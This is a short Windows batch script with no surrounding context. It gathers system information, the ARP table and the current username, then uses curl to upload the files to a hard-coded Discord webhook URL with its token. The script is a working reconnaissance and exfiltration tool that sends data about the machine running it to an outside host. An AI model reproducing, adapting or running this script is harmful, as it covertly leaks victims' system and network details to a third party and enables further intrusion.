setlocal EnableDelayedExpansion
cd %~dp0
systeminfo > systeminfo.txt
arp -a > arp.txt
for /f "delims=" %%b in ('whoami') do set name=%%b
curl -F "file=@%userprofile%\desktop\bb\systeminfo.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
curl -F "file=@%userprofile%\desktop\bb\arp.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
